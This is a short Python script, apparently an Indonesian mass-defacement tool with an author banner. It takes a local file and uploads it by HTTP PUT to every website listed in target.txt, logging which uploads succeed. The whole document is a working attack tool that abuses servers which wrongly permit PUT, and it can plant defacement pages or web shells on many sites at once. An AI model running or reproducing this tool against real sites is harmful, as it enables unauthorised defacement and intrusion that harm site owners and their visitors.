# -*- coding: utf-8 -*-

try:
    import requests
    import os
    import sys
except ImportError:
    exit("install requests and try again ...")

banner = """
Github : /putraoffc
Youtube: putraoffc2
Author Ver AOX /official: Ms.ambari
Github Ms.ambari: /Ranginang67
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
    if sys.version_info.major > 2:
        return str(input(tetew))
    else:
        return str(raw_input(tetew))

def aox(script, target_file="target.txt"):
    op = open(script, "r").read()
    with open(target_file, "r") as target:
        target = target.readlines()
        s = requests.Session()
        print("uploading file to %d website" % (len(target)))
        for web in target:
            try:
                site = web.strip()
                if not site.startswith("http://") and not site.startswith("https://"):
                    site = "http://" + site
                req = s.put(site + "/" + script, data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print(m + "[" + b + "FAILED!" + m + " ] %s/%s" % (site, script))
                else:
                    print(m + "[" + h + "SUCCESS" + m + " ] %s/%s" % (site, script))

            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print()
                exit()

def main(__bn__):
    print(__bn__)
    while True:
        try:
            a = x("Nama script lu: ")
            if not os.path.isfile(a):
                print("file '%s' not found" % (a))
                continue
            else:
                break
        except KeyboardInterrupt:
            print()
            exit()
    aox(a)

if __name__ == "__main__":
    main(banner)
